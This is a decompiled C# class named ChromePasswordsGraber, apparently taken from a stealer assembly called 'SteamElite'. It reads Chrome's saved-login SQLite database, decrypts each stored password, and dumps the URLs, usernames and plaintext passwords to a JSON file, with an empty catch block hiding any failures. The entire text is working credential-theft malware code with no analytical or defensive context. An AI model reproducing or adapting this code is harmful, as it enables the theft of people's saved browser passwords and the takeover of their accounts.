// Decompiled with JetBrains decompiler
// Type: ChromePasswordsGraber
// Assembly: SteamElite, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC0AF3C1-BDDB-427F-AF9C-215450AD8173
// Assembly location: C:\Users\Пользователь\Desktop\Decompiled.exe

using System.Collections.Generic;
using System.Data;
using System.Data.Common;
using System.Data.SQLite;
using System.IO;
using System.Text;
using System.Web.Script.Serialization;

internal class ChromePasswordsGraber
{
  private List<ChromePasswordsGraber.Data> Array = new List<ChromePasswordsGraber.Data>();

  public void GetPSW(string db_way, string _path = "pass.json")
  {
    try
    {
      byte[] entropyBytes = (byte[]) null;
      string str1 = "logins";
      string str2 = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
      DataTable dataTable = new DataTable();
      using (SQLiteConnection sqLiteConnection = new SQLiteConnection(str2))
      {
        ((DbDataAdapter) new SQLiteDataAdapter(new SQLiteCommand(string.Format("SELECT * FROM {0} {1} {2}", (object) str1, (object) "", (object) ""), sqLiteConnection))).Fill(dataTable);
        int count = dataTable.Rows.Count;
        for (int index = 0; index < count; ++index)
        {
          string description;
          byte[] bytes = SQB.Decrypt((byte[]) dataTable.Rows[index][5], entropyBytes, out description);
          this.Array.Add(new ChromePasswordsGraber.Data()
          {
            url = dataTable.Rows[index][1].ToString(),
            password = new UTF8Encoding(true).GetString(bytes),
            login = dataTable.Rows[index][3].ToString()
          });
        }
      }
    }
    catch
    {
    }
    this.ToFile(_path);
  }

  private void ToFile(string _path)
  {
    string contents = new JavaScriptSerializer().Serialize((object) this.Array);
    File.WriteAllText(_path, contents);
  }

  public class Data
  {
    public string login { get; set; }

    public string password { get; set; }

    public string url { get; set; }
  }
}
